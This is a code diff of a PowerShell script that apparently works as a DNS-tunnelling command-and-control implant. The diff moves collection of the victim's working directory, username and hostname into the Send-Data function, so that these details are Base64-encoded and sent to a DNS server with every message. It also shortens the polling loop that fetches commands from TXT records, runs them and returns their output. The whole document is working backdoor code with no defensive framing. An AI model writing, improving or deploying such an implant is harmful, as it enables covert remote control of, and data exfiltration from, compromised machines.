@@ -5,6 +5,15 @@ function Send-Data {
         $counter
     )
 
+    $metadata = @{
+        pwd = $PWD.Path
+        user = $Env:UserName
+        hostname = hostname
+    }
+
+    # Add all of the elements in metadata to data
+    $data = $data + $metadata
+
     $json = $data | ConvertTo-Json
     
     # Encode data as Base64
@@ -37,9 +46,6 @@ $code = (Get-Date).ToString("yyyyMMddHHmmss")
 # Send code to DNS server
 Send-Data -data @{
     code = $code
-    pwd = $PWD.Path
-    user = whoami
-    hostname = hostname
 } -code 0 -counter 0
 
 # Request TXT record from DNS server
@@ -62,17 +68,11 @@ while (!$stop) {
             Write-Host "Sending Output"
             Send-Data -data @{
                 output = $output
-                pwd = $PWD.Path
-                user = whoami
-                hostname = hostname
             } -code $code -counter $commandcount
         }
         catch {
             Send-Data -data @{
                 output = "Error: $_"
-                pwd = $PWD.Path
-                user = whoami
-                hostname = hostname
             }
         }
         $commandcount++
@@ -80,5 +80,5 @@ while (!$stop) {
     else {
         
     }
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 1
 }
